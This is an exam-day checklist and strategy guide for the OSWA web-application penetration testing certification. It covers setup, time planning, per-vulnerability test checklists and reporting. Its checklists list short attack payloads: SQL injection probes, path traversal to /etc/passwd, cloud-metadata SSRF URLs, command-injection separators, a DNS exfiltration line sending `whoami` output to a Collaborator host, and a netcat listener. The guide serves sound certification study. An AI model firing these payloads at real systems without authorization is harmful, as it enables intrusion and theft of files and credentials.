# OSWA Exam Day Checklist & Strategy Guide

## Pre-Exam Preparation (1 Week Before)

### Technical Setup
- [ ] Verify VPN connection to exam environment
- [ ] Test all tools listed in tool-installation-guide.md
- [ ] Update Burp Suite to latest version
- [ ] Update all pentesting tools (`~/update-tools.sh`)
- [ ] Update nuclei templates (`nuclei -update-templates`)
- [ ] Verify SecLists wordlists are accessible
- [ ] Test screen recording software (if required)
- [ ] Backup your VM/system
- [ ] Print quick-reference-cheatsheet.md

### Documentation
- [ ] Organize all study materials in accessible location
- [ ] Bookmark PortSwigger Academy references
- [ ] Prepare note-taking template
- [ ] Set up screenshot capture tool (Flameshot, Greenshot)
- [ ] Test report template formatting

### Physical Setup
- [ ] Clear workspace
- [ ] Prepare snacks and water
- [ ] Charge laptop/devices
- [ ] Test backup power supply
- [ ] Prepare comfortable chair
- [ ] Reduce distractions (phone on silent, close other apps)

---

## Day Before Exam

### System Preparation
```bash
# Run verification script
./tool-check.sh

# Update system
sudo apt update && sudo apt upgrade -y

# Test Burp Suite
java -jar burpsuite.jar &

# Verify network connectivity
ping 8.8.8.8
curl -I https://www.google.com

# Clear disk space
df -h
# Ensure at least 10GB free

# Test VPN connection
# [Connect to exam VPN and verify]
```

### Mental Preparation
- [ ] Review quick-reference-cheatsheet.md
- [ ] Get 8 hours of sleep
- [ ] Light review, no cramming
- [ ] Prepare meal for exam day
- [ ] Set multiple alarms

---

## Exam Day - Pre-Start (30 min before)

### Final Checks
- [ ] Use restroom
- [ ] Prepare water and snacks within reach
- [ ] Close all unnecessary applications
- [ ] Disable notifications (Do Not Disturb mode)
- [ ] Connect to exam VPN
- [ ] Open required tools:
  - Burp Suite
  - Terminal
  - Text editor (for notes)
  - Firefox/Chrome
  - Screenshot tool

### Workspace Setup
```bash
# Create exam working directory
mkdir -p ~/oswa-exam/$(date +%Y%m%d)
cd ~/oswa-exam/$(date +%Y%m%d)

# Create subdirectories
mkdir screenshots notes payloads exploits evidence

# Start Burp Suite with project
burpsuite_community --project-file=oswa-exam.burp &

# Open note file
touch notes.md
```

### Burp Suite Configuration
- [ ] Set scope to exam targets only
- [ ] Configure proxy on 127.0.0.1:8080
- [ ] Enable logging in Proxy → Options
- [ ] Install/enable Autorize extension
- [ ] Install/enable Param Miner extension
- [ ] Clear previous project data

---

## Time Management Strategy

### Total Exam Time: 24 hours (adjust based on actual exam)

**Recommended Breakdown**:

#### Phase 1: Reconnaissance (2 hours)
- [ ] **00:00 - 00:30**: Read all exam instructions thoroughly
- [ ] **00:30 - 01:00**: Map application structure
  - Crawl all pages with Burp Spider
  - Identify all forms, inputs, parameters
  - Note all functionality (upload, search, login, etc.)
- [ ] **01:00 - 02:00**: Technology identification
  - Use Wappalyzer
  - Check HTTP headers
  - Identify frameworks, languages, servers
  - Document in `notes.md`

#### Phase 2: Vulnerability Testing (6 hours)
**Prioritize by likelihood and impact**:

- [ ] **02:00 - 02:45**: XSS Testing (HIGH priority)
  - Test all input fields
  - Reflected → Stored → DOM-based
  - Document findings

- [ ] **02:45 - 03:45**: SQL Injection (HIGH priority)
  - Test all parameters with `'` and `"`
  - Boolean-based → Union → Time-based
  - Run SQLMap on promising targets

- [ ] **03:45 - 04:15**: IDOR Testing (HIGH priority)
  - Test with 2 different user accounts
  - Enumerate sequential IDs
  - Check authorization on all endpoints

- [ ] **04:15 - 04:45**: CSRF Testing
  - Generate CSRF PoCs for state-changing requests
  - Test SameSite cookie attributes

- [ ] **04:45 - 05:30**: SSRF Testing
  - Test all URL input features
  - Try localhost, internal IPs, metadata endpoints

- [ ] **05:30 - 06:15**: Directory Traversal
  - Test file download/upload features
  - Try path traversal sequences
  - Test for LFI/RFI

- [ ] **06:15 - 07:00**: Command Injection
  - Test ping, whois, nslookup features
  - Try command separators
  - Test time-based blind injection

- [ ] **07:00 - 08:00**: Advanced Testing
  - XXE (if XML input exists)
  - SSTI (if templating detected)
  - CORS misconfigurations
  - Other findings from recon

#### Phase 3: Exploitation & Evidence (4 hours)
- [ ] **08:00 - 10:00**: Exploit confirmed vulnerabilities
  - Get maximum impact proof
  - Capture screenshots
  - Save request/response
  - Document exploitation steps

- [ ] **10:00 - 12:00**: Chain vulnerabilities
  - IDOR + XSS
  - CSRF + XSS
  - SSRF + XXE
  - Document complex attack chains

#### Phase 4: Documentation & Reporting (4 hours)
- [ ] **12:00 - 14:00**: Organize findings
  - Sort by severity (Critical, High, Medium, Low)
  - Verify all screenshots are clear
  - Ensure all proof-of-concepts work

- [ ] **14:00 - 16:00**: Write report
  - Follow exam template
  - Include all required sections
  - Add reproduction steps
  - Include impact assessment

#### Phase 5: Review & Buffer (8 hours)
- [ ] **16:00 - 20:00**: Re-test edge cases
  - Try advanced bypasses
  - Test authenticated vs unauthenticated
  - Test different user roles
  - Look for blind vulnerabilities

- [ ] **20:00 - 22:00**: Final review
  - Proofread report
  - Verify all screenshots
  - Test all PoCs one more time
  - Check submission requirements

- [ ] **22:00 - 24:00**: Buffer time & submission
  - Final checks
  - Submit report
  - Backup all evidence
  - Rest!

---

## Testing Checklist by Vulnerability

### XSS Testing
- [ ] Test all input fields (reflected)
- [ ] Test all persistent inputs (stored)
- [ ] Check URL parameters
- [ ] Check HTTP headers (User-Agent, Referer)
- [ ] Test in different contexts (HTML, JS, attribute)
- [ ] Try bypass techniques (encoding, case variation)
- [ ] Test DOM-based XSS (check JavaScript source)
- [ ] Test file upload XSS (SVG, HTML upload)

### SQL Injection Testing
- [ ] Add single quote `'` to all parameters
- [ ] Test boolean-based: `' AND '1'='1` vs `' AND '1'='2`
- [ ] Test time-based: `'; WAITFOR DELAY '00:00:05'--`
- [ ] Test UNION-based injection
- [ ] Run SQLMap on confirmed vulnerable parameters
- [ ] Test in different contexts (numeric, string, JSON)
- [ ] Test HTTP headers for SQLi
- [ ] Test NoSQL injection if applicable

### IDOR Testing
- [ ] Create 2+ test accounts (different privilege levels)
- [ ] Note all IDs/references for each account
- [ ] Test cross-account access:
  - [ ] Profile pages
  - [ ] Documents/files
  - [ ] Messages
  - [ ] Orders/transactions
  - [ ] API endpoints
- [ ] Test vertical escalation (user → admin)
- [ ] Test encoded IDs (base64, hex)
- [ ] Enumerate sequential IDs
- [ ] Test different HTTP methods (GET, POST, PUT, DELETE)

### SSRF Testing
- [ ] Identify URL input features
- [ ] Test localhost access: `http://localhost`, `http://127.0.0.1`
- [ ] Test internal IP ranges: `http://192.168.1.1`
- [ ] Test cloud metadata: `http://169.254.169.254/latest/meta-data/`
- [ ] Test protocol handlers: `file://`, `gopher://`, `dict://`
- [ ] Test DNS rebinding
- [ ] Test blind SSRF with Burp Collaborator
- [ ] Try IP encoding bypasses (decimal, hex, octal)

### Directory Traversal Testing
- [ ] Test file download parameters
- [ ] Try: `../../../../etc/passwd`
- [ ] Try encoded versions: `..%2F`, `..%252F`
- [ ] Try null byte: `../../../../etc/passwd%00.jpg`
- [ ] Try PHP filters: `php://filter/convert.base64-encode/resource=index.php`
- [ ] Test different file paths (Linux and Windows)
- [ ] Check file upload functionality
- [ ] Test path in cookies/headers

### Command Injection Testing
- [ ] Identify system command features (ping, nslookup, whois)
- [ ] Test command separators: `;`, `|`, `&`, `&&`, `||`
- [ ] Test command substitution: `` `cmd` ``, `$(cmd)`
- [ ] Test time-based: `; sleep 5`
- [ ] Test blind with DNS: `; nslookup $(whoami).burpcollab.com`
- [ ] Try space bypasses: `$IFS`, `{cat,/etc/passwd}`
- [ ] Try keyword bypasses: `c''at`, `/???/c?t`

---

## Note-Taking Template

Create `notes.md` with this structure:

```markdown
# OSWA Exam Notes - [Date]

## Target Information
- Target URL:
- Target IP:
- Technologies:
- Framework:
- Server:

## Findings Summary
| ID | Vulnerability | Severity | Status |
|----|---------------|----------|--------|
| 1  | XSS in search | High     | Confirmed |
| 2  | SQLi in id param | Critical | Confirmed |

## Detailed Findings

### Finding #1: XSS in Search Function
- **Location**: /search?q=
- **Payload**: `<script>alert(1)</script>`
- **Reproduction**:
  1. Navigate to /search
  2. Enter payload in search box
  3. Submit form
  4. XSS executes on results page
- **Screenshot**: `screenshots/001-xss-search.png`
- **Impact**: Cookie theft, session hijacking
- **Recommendation**: Implement output encoding

### Finding #2: SQL Injection in ID Parameter
...

## Exploitation Notes
...

## Questions for Review
- [ ] Question 1
- [ ] Question 2
```

---

## Screenshot Naming Convention

Use consistent naming:
```
001-xss-search-payload.png
002-xss-search-execution.png
003-sqli-error-message.png
004-sqli-union-data.png
005-idor-user-access.png
006-idor-admin-escalation.png
```

**Screenshot Checklist**:
- [ ] Include full browser window (shows URL)
- [ ] Include timestamp if possible
- [ ] Highlight relevant sections
- [ ] Clear and readable
- [ ] Shows both request and response (in Burp)

---

## Common Mistakes to Avoid

### Time Management
- ❌ Spending too long on one vulnerability
- ✅ Set 30-45 min limit per vulnerability type
- ❌ Starting report at last minute
- ✅ Document findings as you go

### Testing
- ❌ Only testing obvious inputs
- ✅ Test headers, cookies, hidden fields
- ❌ Assuming WAF blocks everything
- ✅ Try bypass techniques
- ❌ Only testing as one user
- ✅ Test with multiple accounts/privilege levels

### Documentation
- ❌ Unclear screenshots
- ✅ Annotate and highlight important sections
- ❌ Missing reproduction steps
- ✅ Detailed step-by-step instructions
- ❌ Generic impact description
- ✅ Specific business impact

---

## Emergency Troubleshooting

### Tool Not Working
```bash
# Check if running
ps aux | grep tool_name

# Kill and restart
killall tool_name
tool_name &

# Check logs
tail -f /var/log/tool.log
```

### VPN Connection Drops
```bash
# Reconnect immediately
[VPN reconnect command]

# Verify connection
ping exam_target_ip

# Check if targets still accessible
curl -I http://target.com
```

### Burp Suite Issues
```bash
# Increase memory
java -jar -Xmx4g burpsuite.jar

# Clear project
# File → New project

# Reset proxy settings
# Proxy → Options → Restore defaults
```

### Browser Issues
```bash
# Clear cache
Ctrl+Shift+Del (select all)

# Disable extensions temporarily
# May interfere with testing

# Try incognito/private mode
```

---

## Quick Command Reference

```bash
# Start tmux session (recommended)
tmux new -s oswa-exam

# Split screen
Ctrl+b then "    # Horizontal split
Ctrl+b then %    # Vertical split
Ctrl+b then arrows  # Navigate panes

# Screenshot
flameshot gui    # Or your preferred tool

# Quick HTTP server
python3 -m http.server 8000

# Quick listener
nc -lvnp 4444

# Burp Collaborator
# Use built-in: Burp → Burp Collaborator client

# URL encode/decode
echo "test string" | jq -sRr @uri        # Encode
echo "test%20string" | jq -sRr @uri -d   # Decode

# Base64 encode/decode
echo "test" | base64
echo "dGVzdAo=" | base64 -d

# Generate unique payload identifier
echo "XSS-$(date +%s)"  # XSS-1234567890
```

---

## Mental Breaks Schedule

**Don't skip breaks!** They improve performance.

- After 2 hours: 10 min break (walk, stretch)
- After 4 hours: 20 min break (meal, rest eyes)
- After 6 hours: 30 min break (nap if needed)
- After 8 hours: 15 min break (fresh air)

**Break activities**:
- Walk away from screen
- Stretch
- Hydrate
- Light snack
- Deep breathing

---

## Submission Checklist

Before clicking "Submit":

### Report Quality
- [ ] All required sections included
- [ ] Findings sorted by severity
- [ ] All screenshots are clear
- [ ] All PoCs are tested
- [ ] Reproduction steps are detailed
- [ ] Impact assessment included
- [ ] Remediation recommendations provided
- [ ] No placeholder text (lorem ipsum, TODO)
- [ ] Spell-check completed
- [ ] Consistent formatting

### Evidence Package
- [ ] All screenshots organized
- [ ] Burp project saved
- [ ] Request/response files exported
- [ ] Payload lists saved
- [ ] Tool outputs saved
- [ ] Everything in one zip file (if required)

### Final Verification
- [ ] Read exam instructions one more time
- [ ] Verify submission format (PDF, zip, etc.)
- [ ] Check file size limits
- [ ] Test opening report on different computer
- [ ] Backup everything before submission

---

## Post-Exam

### Immediate
- [ ] Download submission confirmation
- [ ] Backup all exam materials
- [ ] Take a break - you earned it!
- [ ] Don't discuss specifics (if under NDA)

### Next Day
- [ ] Review what went well
- [ ] Note areas for improvement
- [ ] Update your notes/documentation
- [ ] Thank anyone who helped you prepare

---

## Motivational Reminders

> **"You've prepared for this. Trust your knowledge."**

> **"Stay calm. Methodical testing beats rushed attempts."**

> **"Document as you go. Future you will thank present you."**

> **"One vulnerability at a time. You don't need to find everything."**

> **"Breaks are productive. A fresh mind finds more bugs."**

---

## Emergency Contact (If Applicable)

- Exam Proctor Email: _______________________
- Exam Support: _______________________
- Technical Support: _______________________

---

**Good luck! You've got this! 🎯**
